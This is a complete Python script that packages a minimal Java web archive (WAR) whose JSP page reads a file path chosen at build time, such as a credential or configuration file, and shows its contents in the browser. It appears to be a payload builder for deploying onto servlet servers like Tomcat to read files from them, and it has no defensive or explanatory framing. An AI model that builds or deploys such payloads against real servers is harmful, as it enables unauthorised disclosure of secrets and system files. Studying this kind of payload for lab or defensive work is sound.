#!/usr/bin/env python3
from __future__ import annotations

import argparse
import zipfile
from pathlib import Path


def main() -> None:
    parser = argparse.ArgumentParser(description="Build a minimal JSP WAR that reads a target file")
    parser.add_argument("--out", required=True, help="WAR output path")
    parser.add_argument("--target-file", required=True, help="Absolute file path to read from JSP")
    parser.add_argument("--jsp-name", default="read.jsp", help="JSP filename inside the WAR")
    args = parser.parse_args()

    out_path = Path(args.out).resolve()
    out_path.parent.mkdir(parents=True, exist_ok=True)

    jsp_name = Path(args.jsp_name).name
    jsp = (
        '<%@ page import="java.nio.file.*,java.nio.charset.StandardCharsets" %>\n'
        "<pre><%= new String(Files.readAllBytes(Paths.get("
        f'"{args.target_file}"'
        ")), StandardCharsets.UTF_8) %></pre>\n"
    )
    web_xml = '<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1"></web-app>\n'

    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as war:
        war.writestr(jsp_name, jsp)
        war.writestr("WEB-INF/web.xml", web_xml)

    print(out_path)


if __name__ == "__main__":
    main()
